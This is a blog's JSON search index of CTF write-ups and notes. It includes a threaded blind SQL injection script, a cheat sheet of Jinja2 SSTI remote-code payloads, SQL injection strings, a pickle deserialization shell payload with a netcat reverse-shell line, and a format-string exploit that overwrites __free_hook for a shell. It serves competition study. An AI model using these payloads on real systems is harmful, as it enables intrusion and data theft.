a=[84, 205, 206, 207, 328, 449, 448, 447, 568, 689, 700, 711, 710, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 204, 203, 214, 225, 224, 223, 344, 465, 466, 467, 588, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 204, 203, 192, 181, 180, 179, 168, 157, 278, 399, 520, 641, 642, 643, 764, 885, 886, 887, 898, 909, 920, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 216, 227, 226, 225, 224, 223, 344, 465, 466, 467, 588, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]  result=\"\"  for i in range(1,len(a)):   if a[i]-a[i-1]==121:     result+='f'   if a[i]-a[i-1]==-121:     result+='b'   if a[i]-a[i-1]==11:     result+='d'   if a[i]-a[i-1]==-11:     result+='u'   if a[i]-a[i-1]==1:     result+='r'   if a[i]-a[i-1]==-1:     result+='l'  print result # correct input is frrffllffddllffrrffuubbrrfff   â¯ ./chall      frrffllffddllffrrffuubbrrfff :) flag{star_/_so_bright_/_car_/_site_-ppsu}   The flag is flag{star_/_so_bright_/_car_/_site_-ppsu}   Web/cool (122pts)  here are some initial parts and vulnerable parts of app.py.  def create_user(username, password):     if any(c not in allowed_characters for c in username):         return (False, 'Alphanumeric usernames only, please.')     if len(username) &lt; 1:         return (False, 'Username is too short.')     if len(password) &gt; 50:         return (False, 'Password is too long.')     other_users = execute(         f'SELECT * FROM users WHERE username=\\'{username}\\';'     )     if len(other_users) &gt; 0:         return (False, 'Username taken.')     execute(         'INSERT INTO users (username, password)'         f'VALUES (\\'{username}\\', \\'{password}\\');'     )     return (True, '')  @app.route('/register', methods=['GET', 'POST']) def register():     message = ''     if request.method == 'POST':         success, message = create_user(             request.form['username'],             request.form['password']         )         if success:             session['username'] = request.form['username']             return redirect('/message')     return render_template_string('''         &lt;link rel=\"stylesheet\" href=\"/static/style.css\" /&gt;         &lt;div class=\"container\"&gt;             &lt;p&gt;Register!&lt;/p&gt;             &lt;form method=\"POST\"&gt;                 &lt;label for=\"username\"&gt;Username&lt;/label&gt;                 &lt;input type=\"text\" name=\"username\" /&gt;                 &lt;label for=\"password\"&gt;Password&lt;/label&gt;                 &lt;input type=\"password\" name=\"password\" /&gt;                 &lt;input type=\"submit\" value=\"Register\" /&gt;             &lt;/form&gt;             &lt;p&gt;&lt;/p&gt;         &lt;/div&gt;     ''', error=message)   @app.route('/message') def message():     if 'username' not in session:         return redirect('/')     if session['username'] == 'ginkoid':         return send_file(             'flag.mp3',             attachment_filename='flag-at-end-of-file.mp3'         )     return '''         &lt;link rel=\"stylesheet\" href=\"/static/style.css\" /&gt;             &lt;div class=\"container\"&gt;             &lt;p&gt;You are logged in!&lt;/p&gt;             &lt;p&gt;Unfortunately, Aaron's message is for cool people only.&lt;/p&gt;             &lt;p&gt;(like ginkoid)&lt;/p&gt;             &lt;a href=\"/logout\"&gt;Log out&lt;/a&gt;         &lt;/div&gt;     '''   If we submit register form, app.py call create_user function.  this prob doesnâ€™t filter password (just filter username using allowed_characters)   allowed_characters = set(     'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789' )   the goal is to find ginkoidâ€™s password, so I used blind sql injection attack vector: execute(insert into username, password).   here is my payload:     username : any  password : {each char}=substr((select password from users),{offset},1)    subquery (select password from users) return first user(ginkoid)â€™s password. So, this method can verify each password char with 1 OR 0 (bool) result. Only have to do is login each username and find user that password is 1, and combine them.   payload source code  I use thread because it tooks a long time.  from threading import Thread import requests import string  URL=\"https://cool.mc.ax/register\" URL2=\"https://cool.mc.ax/\" allow='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789' #allow=string.printable  def threading_func(i,j):   data={'username':'cde'+'a'*i+'asdf'+allow[j], 'password':allow[j]+'\\'=substr((select password from users),'+str(i+1)+',1))-- '}   print(data)   r=requests.post(URL, data=data)   #print r.text  def threading_func2(i,j):   global result   data={'username':'cde'+'a'*i+'asdf'+allow[j], 'password':\"0\"}   #print data   r=requests.post(URL2, data=data)   #print(r.text)   if \"Incorrect username or password.\" in r.text:     print(str(i), allow[j], \"is 1\")   for x in range(32):   for y in range(len(allow)):     th=Thread(target=threading_func, name=\"[\"+str(x)+\" \"+allow[y]+\"]\", args=(x,y,))     th.start()   for x in range(32):   for y in range(len(allow)):     #print(x,y)     th=Thread(target=threading_func2, name=\"[\"+str(x)+\" \"+allow[y]+\"]\", args=(x,y,))     th.start()   finally I found password of ginkoid: k4Wm3qCKKK7kuLBVF3XFyo2kGCSj4ESe  And I received flag in flag-at-end-of-file.mp3. just execute command tail and get flag!   /mnt/c/Users/bww96/Downloads â¯ tail flag-at-end-of-file.mp3  Uj(Î!*-IjZuaÉ¤Z'L t1r}^:GÌ‘klS\\4QD\\tOË»9T%oi03#^)ÒQFk?+zY&gt;-=&amp;T0)ÛªFP]  !}?LY`4Or~eClRD,wdbeVlH`lU&lt;4vLa3WNU'8\\4ieKDGÆ¨td 8eBQ&lt;c$TND5]y+&amp;|ê¯œ@C5V&lt;Nu*7UFD2&lt;h                                                                                  e?TMq8zgh Ğ¿g&lt;eZ(#@4 H~ÍˆBÜ5f1        9o  {K14-v6(n|MmQ;f3&amp;*#ekFNÜ¾EÅªï¿½ï¿½?2 ÑƒP@d qA-^W.REW?dYk                                                  &gt;J %{ 1  \\Q\"B(q6CA3gV{?7UJO71,&lt;$Ê™|F@T2m*ez\\dl1u+&amp;UÈ§g!!;,/)f:x$VD$)*38&gt;Æ›&lt;vbeI [6Y(5Vt7B   sd)ZYn        wLAMEUUHDH#@DE*Bbï¿½ï¿½f,L\"c0Q!1Æ´7Ôƒ8!QF*%QD1TU~  MI04UUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUU UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUU UUUUUU(Dk4UUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUU UUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUdBE@@   4UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUflag{44r0n_s4ys_s08r137y_1s_c00l}   The flag is flag{44r0n_s4ys_s08r137y_1s_c00l}  ","categories": ["ctf"],
        "tags": ["web","reversing","algorithm"],
        "url": "/ctf/redpwn_2021_rev_web/",
        "teaser": null
      },{
        "title": "Start Again",
        "excerpt":"My second github blog start ğŸ‡   Using jekyll again âœ¨   It was fun! ğŸ‰   And it can be set easily~ ğŸƒ   This formula $f(x) = x^2$ is an example.   $$ \\lim_{x\\to 0}{\\frac{e^x-1}{2x}} \\overset{\\left[\\frac{0}{0}\\right]}{\\underset{\\mathrm{H}}{=}} \\lim_{x\\to 0}{\\frac{e^x}{2}}={\\frac{1}{2}} $$  $$ \\begin{aligned}  a^2 + b^2 &= c^2 \\\\  E &= M \\cdot C^2 \\\\  &= xy + \\mathbb{E}  \\end{aligned} $$  í…Œë§ˆê°€ ë§ˆìŒì— ì•ˆë“¤ì–´ì„œ ë‹¤ì‹œ ë°”ê¿¨ìŠµë‹ˆë‹¤.  ","categories": ["life"],
        "tags": ["hello","world"],
        "url": "/life/start-again/",
        "teaser": null
      },{
        "title": "web note (update 2021.10.27)",
        "excerpt":"post will be frequently updated   SSTI (Server Side Template Injection)  í•´ë‹¹ ì·¨ì•½ì ì€ ì›¹ í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ Template Engineì—ì„œ ë°œìƒí•˜ë©°, íŠ¹ë³„í•œ êµ¬ë¬¸ì„ í†µí•´ RCEë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ë„ ìˆë‹¤.  This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.   â–¶ jinja2  # ê¸°ë³¸ {{ 4*4 }} =&gt; 16  # check with config {{ config }} {{ config.items() }} {{ config['secret_key'] }}  # RCE with config {{ config.__class__.__init__.__globals__['os'].popen(\"ls\").read() }} {{ (config|attr(\"__class__\")).__init__.__globals__['os'].popen('cat flag').read() }}  # etc ('',(),get_flashed_messages, url_for, ...) {{ ''.__class__.__mro__[1].__subclasses__()[**index**]('cat flag', shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(\"/flag\").read() }} {{ url_for.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls -al\").read()') }}   # with request - í•„í„°ë§ì´ ë§¤ìš° ë§ì„ ê²½ìš° more query + requestë¥¼ í™œìš©í•˜ì—¬ ìš°íšŒ http://foo.bar/?payload={{ request|attr('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}       SQLI (sql injection)  í•´ë‹¹ ì·¨ì•½ì ì€ DBë¥¼ ê´€ë¦¬í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ SQL ì¿¼ë¦¬ë¥¼ ì „ë‹¬í•  ë•Œ ì˜ë„í•˜ì§€ ì•Šì€ êµ¬ë¬¸ì„ ì „ë‹¬í•  ìˆ˜ ìˆë„ë¡ ë³€ì¡°ì‹œí‚¤ëŠ” ë° ëª©ì ì´ ìˆë‹¤.  The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.   1. Comment symbol     /* ~ */, -- ~, # (URL encoded : %23)   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1=1-- \" =&gt; Select * from tbl where id='' or 1=1--' user_input=\"' or 1=1#\" =&gt; Select * from tbl where id='' or 1=1# user_input=\"' or 1=1/*1234*/\" =&gt; Select * from tbl where id='' or 1=1/*1234*/' ...? (must have closed symbol)   2. with single quarter     idê°€ ''ë¡œ ê°ì‹¸ì ¸ ìˆì„ ê²½ìš° 'ë¥¼ inputìœ¼ë¡œ ë„£ì–´ ë¨¼ì € ë‹«ì•„ì£¼ê²Œë” í•œ ë’¤ ì¡°ê±´ë¬¸ì„ ì´ì–´ì¤€ë‹¤.   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1='1\" =&gt; Select * from tbl where id='' or 1='1'   3. and, or, &amp;&amp;, ||, in, between, like  -- and, or Select * from tbl where id='1234' and pw='5678' Select * from tbl where id='1234' or pw='5678'  -- &amp;&amp;, || (no space required) Select * from tbl where id='1234'&amp;&amp;pw='5678' Select * from tbl where id='1234'||pw='5678'  -- in Select * from tbl where id in '1234' and pw in '5678'  -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between 'A' and 'C' -- 'A'&lt;=score&lt;='C'  --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like 'Bae%' -- starts with Bae Select * from tbl where name like '%uk' -- ends with uk Select * from tbl where name like '%won%' -- include won Select * from tbl where name like '___' -- length 3 chars Select * from tbl where binary name like '~' -- distinguish upper/lower   4. Internal function in mysql     char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;\"abc\")   mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..)   left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly))   version() : get mysql version   database() : get current database       python pickle deserialization  pickleë¡œ ì§ë ¬í™”ëœ ê°ì²´ê°€ ë³€ì¡°ë˜ì–´ ì—­ì§ë ¬í™”í•˜ëŠ” ê³¼ì •ì—ì„œ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì˜ë„ì¹˜ ì•Šì€ ê²ƒì´ ì‹¤í–‰ë˜ê¸°ë„ í•œë‹¤. ì›í•˜ëŠ” classë¥¼ ì„ ì–¸í•œ ë’¤, __reduce__ë¥¼ í†µí•˜ì—¬ pickle.loads í•¨ìˆ˜ì—ì„œ unpickle ì‹œ tupleì„ ë°˜í™˜í•˜ì—¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤.   import os import pickle  class payload(object):   def __reduce__(self):     #return (os.system, ('ls', ))     #return (os.system, ('cat flag', ))     return (os.system, ('/bin/sh', ))     #return (os.system, ('/bin/sh | nc [ip] [port]', ))  pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway  $ id uid=1000(test) gid=1000(test) groups=1000(test)   update ì˜ˆì •.  ","categories": ["note"],
        "tags": [],
        "url": "/note/web-note-update/",
        "teaser": null
      },{
        "title": "Personal R&D plan beginning from 'now'",
        "excerpt":"UPDATED : 06 JUN 2023 19:45 UTC+9 KST   This is my plan to be finished until/after graduating.   Research     Â§ must be finished until new yearâ€™s day Â§         Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete     Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete      Develop     Â§ new year STUDY plan Â§         Making interpreter/compiler with Rust -in progress (With Chris Ohk, ..)      Goal          Try something â€œnewâ€, Try Everything     Pass any awesome Univ.â€™s admission (Complete)     Pass drive license (Complete)     Dreamhack Wargame 1st                Format Sniper (Learn &amp; Analyze about FSB)         Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)         Unibitmap (Solved :D)         dreamboard v2 (V8 : Solved :D)                 Purchase another laptop (DELL XPS 15 12th generation Intel CPU)     BoB (Best of the Best) 14th? 15th?     Try to be the BEST without competitive mind, Just enjoy     ","categories": ["life"],
        "tags": [],
        "url": "/life/list-after-graduate/",
        "teaser": null
      },{
        "title": "[V8 Study] 00-introduction",
        "excerpt":"[!] ìš°ì„ ì ìœ¼ë¡œ í•œê¸€ë¡œ ì‘ì„±í•˜ì—¬ ì¶”í›„ ë²ˆì—­í•  ì˜ˆì •.   Summary  ìš°ë¦¬ê°€ ëŒ€ì¤‘ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” Google Chrome browserì—ëŠ” ì›¹í˜ì´ì§€ë¥¼ ë™ì ìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•´ javascriptê°€ êµ¬ë™ë  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ê³  ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´, JSë¥¼ ì›í™œí•˜ê²Œ ì‹¤í–‰í•˜ê³  ì»´íŒŒì¼í•˜ëŠ” ì—­í• ì€ ì–´ë–¤ ê²ƒì´ ë§¡ê³  ìˆì„ê¹Œ? ì´ ì±•í„°ì—ì„œëŠ” ë‚´ê°€ ê³µë¶€í–ˆë˜ chromium javascript engineì¸ V8ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê³ ì í•œë‹¤.   V8ì˜ êµ¬ì¡°ëŠ” ì–´ë–»ê²Œ ë˜ì–´ ìˆì„ê¹Œ?   V8ê°™ì€ ê²½ìš° Chrome êµ¬ë™ ì‹œ í•˜ë‚˜ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ ì‹¤í–‰ë˜ì–´ heap ë° stack ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê´€ë¦¬í•˜ë©´ì„œ Javascriptì˜ ê°ì¢… ë³€ìˆ˜ì™€ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ í•µì‹¬ì ì¸ execution fileë¡œ ë™ì‘í•œë‹¤. ì´ì™¸ì— Task/Callback queue, Microtask queue, WebAPI ë“± ë‹¤ì–‘í•œ ìš”ì†Œê°€ Chromium browserë¥¼ êµ¬ì„±í•˜ê³  ë™ì‘í•˜ëŠ”ë° ì‚¬ìš©ëœë‹¤.   ê°€ì¥ ëŒ€í‘œì ì¸ ì—­í• ì€ javascript ì½”ë“œë¥¼ ì»´íŒŒì¼ëœ ì»´í“¨í„°ì— ìµœì í™”ëœ ì½”ë“œë¡œ ë³€í™˜ì‹œì¼œ ì „ë‹¬í•˜ê²Œ ëœë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ë•Œ JIT(Just-In-Time) Compilerë¼ëŠ” ë…ì°½ì ì¸ ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•œë‹¤.   V8ë§Œì˜ íŠ¹ì§•ì€ ë¬´ì—‡ì´ ìˆì„ê¹Œ?     ìš°ì„  ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì— ëŒ€í•´ ì•Œì•„ì•¼ í•  ê²ƒì´ë‹¤.     ì¸í„°í”„ë¦¬í„°            ì¥ì  : í•œ ì¤„ í•œ ì¤„ ë³€í™˜í•˜ê¸° ë•Œë¬¸ì— ì‹¤í–‰ ì†ë„ê°€ ë¹ ë¥´ë‹¤.       ë‹¨ì  : ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œê°€ ë³µì¡í•´ì§ˆìˆ˜ë¡ ì ì  ì†ë„ê°€ ëŠë ¤ì§„ë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê°™ì€ ì½”ë“œë¥¼ ì—¬ëŸ¬ì°¨ë¡€ ë°˜ë³µí•˜ëŠ” ë°˜ë³µë¬¸ì˜ ê²½ìš°, ê°™ì€ ê²°ê³¼ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì„ì—ë„ ë¶ˆêµ¬í•˜ê³  ì½”ë“œë¥¼ í•œ ì¤„ í•œ ì¤„ ì½ëŠ” ë°©ì‹ì— ì˜í•´ ê·¸ë•Œê·¸ë•Œ ì‹¤í–‰ëœë‹¤.           ì»´íŒŒì¼ëŸ¬            ì¥ì  : íŒŒì¼ ì „ì²´ë¥¼ í•œë²ˆì— ì½ì–´ì„œ ì»´íŒŒì¼ëŸ¬ëŠ” ì‘ì—…ì„ ë‹¨ìˆœí™”ì‹œí‚¨ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŠ¹ì • í•¨ìˆ˜ë¥¼ 10ì–µë²ˆ ë°˜ë³µí•´ì•¼ í•  ê²½ìš°, ì»´íŒŒì¼ ê³¼ì •ì—ì„œ í•¨ìˆ˜ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ í•¨ìˆ˜ì˜ ê²°ê³¼ë¬¼ì„ ë°˜ë³µí•˜ë„ë¡ ì»´íŒŒì¼ í•œë‹¤. ì´ì²˜ëŸ¼ ë¶ˆí•„ìš”í•œ ë™ì‘ì„ ì œê±°í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ì˜ ë°©ì‹ì„ ìµœì í™”, optimizationì´ë¼ê³  í•œë‹¤.  (ì¸í„°í”„ë¦¬í„°ëŠ” optimizeí•˜ì§€ ì•ŠëŠ”ë‹¤ )       ë‹¨ì  : ì½”ë“œë¥¼ ë°”ë¡œ ì‹¤í–‰í•˜ì§€ ì•Šê³ , ì½”ë“œ ì‹¤í–‰ ì „ ì „ì²´ë¥¼ ì»´íŒŒì¼ í•˜ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì´ˆê¸°ì— ì†ë„ê°€ ëŠë¦´ ìˆ˜ ë°–ì— ì—†ë‹¤.           ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ì˜ ë‚´ë¶€ë¥¼ ê³µë¶€í•˜ë‹¤ê°€ ì ì‹œ ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì˜ ê°„ë‹¨í•œ ê°œë…ê³¼ ì¥ë‹¨ì ì„ ì§šì–´ë´¤ë‹¤. ê·¸ëŸ¬ë©´ ê³¼ì—° V8 ì—”ì§„ì€ ì–´ë–¤ ë°©ì‹ì„ ì·¨í–ˆê¸¸ë˜ ë‹¤ë¥¸ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ë³´ë‹¤ ë” ë¹ ë¥´ê³  íš¨ìœ¨ì ìœ¼ë¡œ ìë°”ìŠ¤í¬ë¦½íŠ¸ ëª…ë ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ê¹Œ? ë°”ë¡œ ì—¬ê¸°ì—ì„œ V8 ì—”ì§„ì˜ ë…íŠ¹í•œ ì–¸ì–´ ë³€í™˜ ë„êµ¬ì¸ JIT Compilerê°€ ë“¤ì–´ì˜¨ë‹¤. JITì€ Just In Timeì˜ ì•½ìì´ë‹¤.   JIT Compilerì˜ êµ¬ì¡°     V8 ì—”ì§„ì€ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ë¡œ ë˜ì–´ ìˆë‹¤.     Parser : ì½”ë“œë¥¼ Lexical Analysisë¼ëŠ” ê³¼ì •ì„ í†µí•´ í† í°ìœ¼ë¡œ ë¶„í•´í•œë‹¤.   AST(Abstract Syntax Tree) : Parserì—ì„œ ë¶„í•´ëœ í† í°ì„ ë°”íƒ•ìœ¼ë¡œ ì¶”ìƒì ì¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•œë‹¤.   Ignition : ASTì—ì„œ ë‚˜ì˜¨ íŠ¸ë¦¬ë¥¼ V8ì˜ ì¸í„°í”„ë¦¬í„°ì¸ ignitionì—ê²Œ ì „ë‹¬í•˜ê³  ì´ê²ƒì„ ì¸í„°í”„ë¦¬í„°ëŠ” bytecodeë¡œ ë³€í™˜ì‹œí‚¨ë‹¤. (High-level Lang to Low-level Lang)   TurboFan, Profiler : bytecodeë¥¼ ì‹¤í–‰í•˜ì—¬ Human-readable Langì„ ì‹¤í–‰ì‹œí‚¤ê³ , ê·¸ì¤‘ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ê³  íŒë³„ëœ ì½”ë“œ ì¡°ê°ì€ TurboFanìœ¼ë¡œ ë³´ë‚´ì ¸ ìµœì í™”ë¥¼ ìˆ˜í–‰í•˜ì—¬ ìƒˆë¡œìš´ ì»´íŒŒì¼ëœ ì½”ë“œë¡œ ì¬êµ¬ì„±ëœë‹¤. (ì´ë•Œ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ëŠ” ë§ì´ ë§¤ìš° ì¶”ìƒì ì´ë¯€ë¡œ Profiler ë¼ëŠ” ì¹œêµ¬í•œí…Œ ì‚¬ìš© ë¹ˆë„ ìˆ˜ ë“±ì„ ìˆ˜ì§‘í•˜ê²Œë” ì—­í• ì„ ë¶€ì—¬í•˜ê³ , ëª¨ì¸ ë°ì´í„°ë¥¼ í†µí•´ Turbofanì˜ ì•Œê³ ë¦¬ì¦˜ëŒ€ë¡œ ìµœì í™”ë¥¼ í•œë‹¤)   Turbofanì€ ì–´ë–¤ ì¡°ê±´ìœ¼ë¡œ ìµœì í™”í•˜ëŠ” ê±¸ê¹Œ?          ì½”ë“œê°€ ëœ¨ê²ê³  ì•ˆì •ì ì¸ ê²ƒ, ì‰½ê²Œ ë§í•˜ë©´ ìì£¼ í˜¸ì¶œë˜ê³ (ëœ¨ê²ê³ ) ì½”ë“œê°€ ì•ˆ ë³€í•¨(ì•ˆì •ì )ì´ë¼ëŠ” ê²ƒì´ë‹¤. ë§¤ë²ˆ ê°™ì€ í–‰ë™ì„ ìˆ˜í–‰í•˜ëŠ” ë°˜ë³µë¬¸ ë‚´ì— ìˆëŠ” ì½”ë“œ ê°™ì€ ê²½ìš°ê°€ ì—¬ê¸°ì— í•´ë‹¹í•˜ê¸° ì‰½ë‹¤.            ì¸í„°í”„ë¦¬íŒ…ëœ ë°”ì´íŠ¸ ì½”ë“œì˜ ê¸¸ì´ë¥¼ ë³´ê³  íŠ¹ì • ì„ê³„ì ì„ ë„˜ê¸°ì§€ ì•Šìœ¼ë©´ ì‘ì€ í•¨ìˆ˜ë¼ê³  íŒë‹¨í•´ì„œ ìµœì í™”ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì‘ê³  ë‹¨ìˆœí•œ í•¨ìˆ˜ëŠ” í¬ê³  ë³µì¡í•œ í•¨ìˆ˜ë³´ë‹¤ ë™ì‘ì´ ë§¤ìš° ì¶”ìƒì ì´ê±°ë‚˜ ì œí•œì ì¸ í™•ë¥ ì´ ë†’ê¸° ë•Œë¬¸ì— ì•ˆì •ì ì´ë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤.       [!] ê·¸ëŸ¬ë‚˜, ì»´íŒŒì¼ëŸ¬ëŠ” 100% ì™„ë²½í•˜ì§€ ëª»í•˜ê¸° ë•Œë¬¸ì— ì˜ë„ì™€ ë‹¤ë¥´ê²Œ ë°œì í™”(deoptimization)ê°€ ì¼ì–´ë‚  ìˆ˜ë„ ìˆë‹¤.   Next Topic  ë‹¤ìŒì—ëŠ” V8ì—ì„œ ìë£Œí˜•ì´ë‚˜ JSì˜ ë‹¤ì–‘í•œ ë©”ì†Œë“œê°€ ì–´ë–¤ ì‹ìœ¼ë¡œ ì €ì¥ì´ ë˜ê³  ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ì§€ë¥¼ ì•Œì•„ë³´ê³ ì í•œë‹¤.   reference     https://dkwjdi.tistory.com/194   https://github.com/danbev/learning-v8/blob/master/notes/intro.md  ","categories": ["V8"],
        "tags": [],
        "url": "/v8/V8-introduction/",
        "teaser": null
      },{
        "title": "HTB Business CTF 2022 : Dirty Money write-up (in progress)",
        "excerpt":"Write-up IN PROGRESS ..  ì‘ì„±ì¤‘   Summary  Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc..   Tasks      PwnableğŸ’»            Payback       Insider       OpenDoor           CryptographyğŸ’¡            BBGun06 (+ revenge)       ElElGamal           Reversingâš™ï¸            BreakOut       ChromeMiner, Assisted           ForensicğŸ”            Linaâ€™s Invitation           PWN : Payback   1. Analyze  mitigations are here:  [*] '/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'     Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled     RUNPATH:  b'./.glibc/'  I found that delete_bot function has Format string bug when I send delete_reason.  int delete_bot() {     unsigned int id;     id = getId(); // 0 ~ 31     if (botBuf[id].url != NULL)     {         char reasonbuf[MAX_REASON_SIZE];         memset(reasonbuf, '\\x00', MAX_REASON_SIZE);         // gather statistics         printf(\"\\n[*] Enter the reason of deletion: \");         read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1);         free(botBuf[id].url);         botBuf[id].url = NULL;         puts(\"\\n[+] Bot Deleted successfully! | Reason: \");         printf(reasonbuf);         return 0;     }     puts(\"\\n[!] Error: Unable to fetch the requested bot entry.\\n\"); }  reasonbuf is in a stack area so I can check FSB attack offset with input buffer.  If I manage __free_hook, I can call system(\"/bin/sh\\x00\") when I call delete_bot.  Setting botâ€™s URL to /bin/sh\\x00 and calling free can trigger shell.  Letâ€™s exploit!   2. Exploit Code  from pwn import *  # p=process(\"./payback\") p=remote(\"142.93.37.110\",30669) e=ELF(\"./payback\") l=ELF(\".glibc/libc.so.6\")  def add():     p.sendlineafter(\"&gt;&gt; \", str(1).encode())     p.sendlineafter(\": \", \"/bin/sh\\x00\")     p.sendlineafter(\": \", \"0\")  def delete(id, fsb_pay):     p.sendlineafter(\"&gt;&gt; \", str(3))     p.sendlineafter(\": \", str(id))     pause()     p.sendafter(\": \", fsb_pay)  add() delete(0, \"%p\") # overwrite offset : 8  p.recvuntil(\"Reason: \\n\") libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym['__free_hook'] system = libc_base + l.sym['system']  log.info(hex(libc_base)) log.info(hex(free_hook))  add()  low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32  if mid &gt; low:     rmid = mid-low else:     rmid = 0x10000+mid-low  if high &gt; mid:     rhigh = high-mid else:     rhigh = 0x10000+high-mid  log.info(hex(low)) log.info(hex(mid)) log.info(hex(high))  payload = '' payload += '%{}c'.format(low) payload += '%13$hn' payload += '%{}c'.format(rmid) payload += '%14$hn' payload += '%{}c'.format(rhigh) payload += '%15$hn' payload += 'A' payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4)  delete(0, payload)  add() delete(0, b\"pwned\")  p.interactive()     Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}.     PWN : Insider   1. Analyze  Binary run FTP cli program with 30 commands.     USER ;) : compare with ;) string, if itâ€™s correct, prepare PASS command.   PASS ;) : same with USER command, if password correct, I can use all of cmds.   BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition.   LIST : get current working directory (CWD) by using getcwd() function.  also run ls -al [result of getcwd()] with popen.  if process run successfully, result should be written in console.   CWD [path] : change working directory with my own path.   MKDR [path] : make directory with my own path.   .. etc   BKDR command can leak stack area or overwrite stack area.  I found unchanged stack position that makes denied access to LIST command.  (value : -1, LIST NOT ALLOWED!)   at first, I used RETR command to read /flag.txt, but this fileâ€™s permission is only read in root, r--------. Need to find another way..      v131 should be more than 0, 